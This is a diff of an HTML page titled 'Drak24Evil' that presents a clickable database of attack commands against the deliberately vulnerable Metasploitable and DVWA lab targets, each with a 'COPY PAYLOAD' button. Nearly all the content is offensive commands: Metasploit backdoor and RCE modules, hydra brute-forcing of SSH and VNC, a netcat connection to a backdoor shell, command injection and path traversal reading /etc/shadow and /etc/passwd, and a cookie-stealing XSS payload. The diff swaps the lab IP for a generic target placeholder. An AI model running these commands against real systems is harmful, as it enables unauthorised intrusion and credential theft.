@@ -3,98 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Drak24Evil | Full 28 Target Audit</title>
+    <title>Drak24Evil | Live Audit Database</title>
     <style>
         :root {
             --blue: #00d4ff; --red: #ff3e3e; --orange: #ff9d00;
             --bg: #0a0b0c; --card: #14171a; --green: #00ff41; --web: #9b59b6;
         }
-        body { background: var(--bg); color: #e1e1e1; font-family: sans-serif; margin: 0; padding: 0; }
+        body { background: var(--bg); color: #e1e1e1; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; line-height: 1.5; }
         .container { max-width: 1200px; margin: 0 auto; padding: 15px; }
+        
         header {
-            background: var(--card); padding: 15px; border-bottom: 3px solid var(--blue);
+            background: var(--card); padding: 20px; border-bottom: 3px solid var(--blue);
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 20px; border-radius: 0 0 10px 10px;
+            margin-bottom: 25px; border-radius: 0 0 12px 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px; }
-        .card { background: var(--card); border: 1px solid #333; padding: 15px; border-radius: 8px; cursor: pointer; }
-        .card:active { background: #1c2024; border-color: var(--blue); }
-        .port-text { color: var(--blue); font-family: monospace; font-size: 0.8em; font-weight: bold; }
-        .overlay { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
-        .modal { background: #111; margin: 5% auto; padding: 20px; width: 85%; max-width: 600px; border: 1px solid var(--blue); border-radius: 12px; max-height: 85vh; overflow-y: auto; }
-        .close { float: right; font-size: 30px; color: #fff; cursor: pointer; }
-        .label { color: var(--blue); font-size: 0.75em; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
-        .box { background: #000; padding: 12px; border-radius: 6px; border-left: 3px solid var(--green); font-family: monospace; font-size: 0.9em; margin-top: 5px; white-space: pre-wrap; word-break: break-all; }
-        .tag { float: right; font-size: 0.6em; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; }
+        
+        .card { 
+            background: var(--card); border: 1px solid #333; padding: 18px; border-radius: 10px; 
+            cursor: pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        @media (hover: hover) {
+            .card:hover { border-color: var(--blue); transform: translateY(-5px); background: #1c2024; }
+        }
+        
+        .card:active { transform: scale(0.97); }
+
+        .port-text { color: var(--blue); font-family: 'Courier New', monospace; font-size: 0.85em; font-weight: bold; }
+        
+        /* Modal - GitHub Pages Optimization */
+        .overlay { 
+            display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.9); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+        }
+        .modal { 
+            background: #111; margin: 40px auto; padding: 25px; width: 85%; max-width: 650px; 
+            border: 1px solid var(--blue); border-radius: 15px; max-height: 80vh; overflow-y: auto; 
+            box-shadow: 0 0 30px rgba(0,212,255,0.2);
+        }
+        .close { float: right; font-size: 35px; color: #fff; cursor: pointer; line-height: 0.8; }
+        
+        .label { color: var(--blue); font-size: 0.75em; font-weight: bold; display: block; margin-top: 18px; text-transform: uppercase; letter-spacing: 1px; }
+        .box { 
+            background: #000; padding: 15px; border-radius: 8px; border-left: 4px solid var(--green); 
+            font-family: 'Consolas', monospace; font-size: 0.95em; margin-top: 8px; 
+            white-space: pre-wrap; word-break: break-all; color: var(--green);
+        }
+
+        .tag { float: right; font-size: 0.65em; padding: 3px 8px; border-radius: 5px; font-weight: bold; text-transform: uppercase; }
         .crit { background: var(--red); color: #fff; }
         .high { background: var(--orange); color: #000; }
         .web { background: var(--web); color: #fff; }
-        .btn { background: var(--blue); color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; }
+
+        .btn { 
+            background: var(--blue); color: #000; border: none; padding: 12px; border-radius: 6px; 
+            font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; font-size: 1em;
+            transition: 0.2s;
+        }
+        .btn:active { background: #fff; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <header>
-        <div><h2 style="margin:0; color:var(--blue);">DRAK24EVIL ULTRA</h2><small style="color:#666;">COMPLETE 28 TARGET DATABASE</small></div>
-        <a href="https://t.me/Drak24Evil" style="color:#24A1DE; text-decoration:none; font-weight:bold;">Telegram</a>
+        <div>
+            <h2 style="margin:0; color:var(--blue); letter-spacing: 1px;">DRAK24EVIL PUBLIC</h2>
+            <small style="color:#888;">LIVE SECURITY AUDIT DATABASE</small>
+        </div>
+        <a href="https://t.me/Drak24Evil" target="_blank" style="color:#24A1DE; text-decoration:none; font-weight:bold; border:1px solid #24A1DE; padding:5px 10px; border-radius:5px;">Join Telegram</a>
     </header>
     <div class="grid" id="mainGrid"></div>
 </div>
 
-<div id="pocModal" class="overlay"><div class="modal"><span class="close" id="closeBtn">&times;</span><div id="pocBody"></div></div></div>
+<div id="pocModal" class="overlay">
+    <div class="modal">
+        <span class="close" id="closeBtn">&times;</span>
+        <div id="pocBody"></div>
+    </div>
+</div>
 
 <script>
+// FULL 28 TARGET DATASET
 var data = [
-    {p:"21", n:"vsftpd 2.3.4 Backdoor", s:"Critical", e:"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"},
-    {p:"22", n:"SSH Brute Force", s:"High", e:"hydra -l msfadmin -P rockyou.txt 192.168.1.7 ssh"},
-    {p:"23", n:"Telnet Default Login", s:"High", e:"telnet 192.168.1.7\nmsfadmin / msfadmin"},
-    {p:"25", n:"SMTP User Enumeration", s:"Low", e:"use auxiliary/scanner/smtp/smtp_enum\nrun"},
-    {p:"53", n:"DNS Zone Transfer", s:"Medium", e:"dig axfr @192.168.1.7 metaspotiable.local"},
-    {p:"80", n:"PHP CGI Arg Injection", s:"Critical", e:"use exploit/multi/http/php_cgi_arg_injection\nrun"},
-    {p:"111", n:"RPCBind Info", s:"Low", e:"rpcinfo -p 192.168.1.7"},
-    {p:"139", n:"Samba usermap_script", s:"Critical", e:"use exploit/multi/samba/usermap_script\nexploit"},
-    {p:"445", n:"SMB NULL Session", s:"High", e:"smbclient -L //192.168.1.7"},
-    {p:"512", n:"Rexec Trust Exploit", s:"High", e:"rlogin -l root 192.168.1.7"},
-    {p:"513", n:"Rlogin Access", s:"High", e:"use auxiliary/scanner/rservices/rlogin_login"},
-    {p:"514", n:"Rsh Shell", s:"High", e:"rsh -l root 192.168.1.7 help"},
+    {p:"21", n:"vsftpd 2.3.4 Backdoor", s:"Critical", e:"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS [IP]\nexploit"},
+    {p:"22", n:"SSH Brute Force", s:"High", e:"hydra -l msfadmin -P rockyou.txt [IP] ssh"},
+    {p:"23", n:"Telnet Default Access", s:"High", e:"telnet [IP]\nmsfadmin : msfadmin"},
+    {p:"25", n:"SMTP User Enum", s:"Medium", e:"smtp-user-enum -M VRFY -U users.txt -t [IP]"},
+    {p:"53", n:"DNS Zone Transfer", s:"Medium", e:"dig axfr @[IP] domain.local"},
+    {p:"80", n:"PHP CGI Injection", s:"Critical", e:"use exploit/multi/http/php_cgi_arg_injection\nrun"},
+    {p:"111", n:"NFS rpcbind Info", s:"Low", e:"nmap -sV -p 111 --script=rpcinfo [IP]"},
+    {p:"139", n:"Samba usermap_script", s:"Critical", e:"use exploit/multi/samba/usermap_script\nrun"},
+    {p:"445", n:"SMB NULL Session", s:"High", e:"smbclient -L //[IP]"},
+    {p:"512", n:"Rexec Trust Exploit", s:"High", e:"rlogin -l root [IP]"},
+    {p:"514", n:"Rsh Shell Access", s:"High", e:"rsh -l root [IP] help"},
     {p:"1099", n:"Java RMI Registry", s:"Critical", e:"use exploit/multi/misc/java_rmi_server"},
-    {p:"1524", n:"Ingreslock Backdoor", s:"Critical", e:"nc 192.168.1.7 1524"},
-    {p:"2049", n:"NFS Mount Vulnerability", s:"High", e:"showmount -e 192.168.1.7"},
+    {p:"1524", n:"Ingreslock Shell", s:"Critical", e:"nc [IP] 1524"},
+    {p:"2049", n:"NFS Share Mount", s:"High", e:"mount -t nfs [IP]:/ /mnt/target"},
     {p:"2121", n:"ProFTPD 1.3.1 Backdoor", s:"Critical", e:"use exploit/unix/ftp/proftpd_133c_backdoor"},
-    {p:"3306", n:"MySQL Empty Password", s:"High", e:"mysql -u root -h 192.168.1.7"},
+    {p:"3306", n:"MySQL No Password", s:"High", e:"mysql -h [IP] -u root"},
     {p:"3632", n:"Distccd RCE", s:"Critical", e:"use exploit/unix/misc/distcc_exec"},
-    {p:"5432", n:"PostgreSQL UDF", s:"Critical", e:"use exploit/linux/postgres/postgres_payload"},
-    {p:"5900", n:"VNC Brute Force", s:"High", e:"hydra -P rockyou.txt 192.168.1.7 vnc"},
+    {p:"5432", n:"PostgreSQL UDF Exec", s:"Critical", e:"use exploit/linux/postgres/postgres_payload"},
+    {p:"5900", n:"VNC Brute Force", s:"High", e:"vncviewer [IP]"},
     {p:"6667", n:"UnrealIRCd 3.2.8.1", s:"Critical", e:"use exploit/unix/irc/unreal_ircd_3281_backdoor"},
-    {p:"8080", n:"TikiWiki Formula Exec", s:"High", e:"use exploit/multi/http/tikiwiki_graph_formula_exec"},
+    {p:"8080", n:"TikiWiki Formula", s:"High", e:"use exploit/multi/http/tikiwiki_graph_formula_exec"},
     {p:"8180", n:"Tomcat Manager Deploy", s:"Critical", e:"use exploit/multi/http/tomcat_mgr_deploy"},
-    {p:"WEB", n:"SQL Injection (DVWA)", s:"Critical", e:"sqlmap -u 'http://192.168.1.7/dvwa/sqli' --dbs"},
-    {p:"WEB", n:"XSS Reflected", s:"High", e:"<script>alert('Drak24Evil')</script>"},
-    {p:"WEB", n:"Command Injection", s:"Critical", e:"127.0.0.1; cat /etc/shadow"},
-    {p:"WEB", n:"LFI File Read", s:"High", e:"/dvwa/fi/?page=../../../../etc/passwd"},
-    {p:"WEB", n:"WebDAV Upload", s:"High", e:"cadaver http://192.168.1.7/dav/"}
+    {p:"WEB", n:"SQL Injection", s:"Critical", e:"sqlmap -u 'http://[IP]/dvwa/sqli?id=1' --dbs"},
+    {p:"WEB", n:"XSS (Reflected)", s:"High", e:"<script>alert(document.cookie)</script>"},
+    {p:"WEB", n:"Command Injection", s:"Critical", e:"[IP]; cat /etc/passwd"},
+    {p:"WEB", n:"LFI Traversal", s:"High", e:"/dvwa/fi/?page=../../../../etc/passwd"},
+    {p:"WEB", n:"WebDAV Upload", s:"High", e:"cadaver http://[IP]/dav/"},
+    {p:"WEB", n:"Brute Force (Web)", s:"High", e:"hydra [IP] http-form-post '/login.php:user=^USER^&pass=^PASS^:F=Login failed'"}
 ];
 
 var g = document.getElementById('mainGrid');
 for (var i = 0; i < data.length; i++) {
-    (function(x){
-        var d = document.createElement('div');
-        d.className = 'card';
-        var t = x.p === 'WEB' ? 'web' : (x.s === 'Critical' ? 'crit' : 'high');
-        d.innerHTML = '<span class="tag '+t+'">'+x.s+'</span><span class="port-text">REF: '+x.p+'</span><h3>'+x.n+'</h3>';
-        d.onclick = function() {
-            document.getElementById('pocBody').innerHTML = '<h2>'+x.n+'</h2><span class="label">POC Payload</span><div id="copyBox" class="box">'+x.e+'</div><button class="btn" onclick="copyIt()">COPY PAYLOAD</button>';
+    (function(item){
+        var card = document.createElement('div');
+        card.className = 'card';
+        var tagClass = item.p === 'WEB' ? 'web' : (item.s === 'Critical' ? 'crit' : 'high');
+        card.innerHTML = '<span class="tag '+tagClass+'">'+item.s+'</span><span class="port-text">PORT '+item.p+'</span><h3>'+item.n+'</h3>';
+        card.onclick = function() {
+            document.getElementById('pocBody').innerHTML = 
+                '<h2 style="color:var(--blue); margin-top:0;">'+item.n+'</h2>' +
+                '<span class="label">Exploit Command</span><div id="copyThis" class="box">'+item.e+'</div>' +
+                '<button class="btn" onclick="copyAction()">COPY PAYLOAD</button>';
             document.getElementById('pocModal').style.display = 'block';
         };
-        g.appendChild(d);
+        g.appendChild(card);
     })(data[i]);
 }
 
-function copyIt() {
-    var t = document.getElementById('copyBox').innerText;
-    var a = document.createElement('textarea'); a.value = t; document.body.appendChild(a); a.select(); document.execCommand('copy'); document.body.removeChild(a); alert('Copied!');
+// GitHub Pages Compatible Copy Function
+function copyAction() {
+    var text = document.getElementById('copyThis').innerText;
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(text).then(function() {
+            alert('Copied to Clipboard!');
+        });
+    } else {
+        var textArea = document.createElement("textarea");
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        alert('Copied!');
+    }
 }
+
 document.getElementById('closeBtn').onclick = function() { document.getElementById('pocModal').style.display = 'none'; };
 window.onclick = function(e) { if(e.target == document.getElementById('pocModal')) document.getElementById('pocModal').style.display = 'none'; };
 </script>
